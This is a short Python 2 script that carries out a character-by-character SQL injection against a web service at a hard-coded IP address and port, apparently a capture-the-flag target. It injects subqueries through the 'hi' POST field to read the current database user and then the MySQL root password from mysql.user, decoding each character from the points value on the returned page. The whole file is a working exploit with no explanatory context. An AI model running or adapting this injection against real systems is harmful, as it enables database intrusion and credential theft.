#coding=utf-8
import requests
import re
rs = requests.session()
url = "http://47.97.168.223:23333"

def user():
    key = ""
    for j in xrange(1,30):
        data = {'flag':'0',
                'hi':"+(select ord(substr((user()),"+str(j)+",1)))#"
                }
        r1 = rs.post(url,data = data)
        # print i
        if 'sorry' in r1.text:
            print 'sorry'
            exit(0)
        if 'fuck' in r1.text:
            print 'fuck'
            exit(0)
        # print r1.text
        r1 = re.findall("<grey>My Points</grey> | (.*)<br/>",r1.content)[1]
        # print r1
        if int(r1)!=0:
            print chr(int(r1))+" -------------- "+str(j)
            key += chr(int(r1))

    print key

def flag():
    key = ""
    for j in xrange(1,30):
        data = {'flag':'0',
                'hi':"+(select ord(substr((select password from mysql.user where user like 'root'),"+str(j)+",1)))#"
                }
        r1 = rs.post(url,data = data)
        # print i
        if 'sorry' in r1.text:
            print 'sorry'
            exit(0)
        if 'fuck' in r1.text:
            print 'fuck'
            exit(0)
        # print r1.text
        r1 = re.findall("<grey>My Points</grey> | (.*)<br/>",r1.content)[1]
        # print r1
        if int(r1)!=0:
            print chr(int(r1))+" -------------- "+str(j)
            key += chr(int(r1))

    print key



# user()
flag()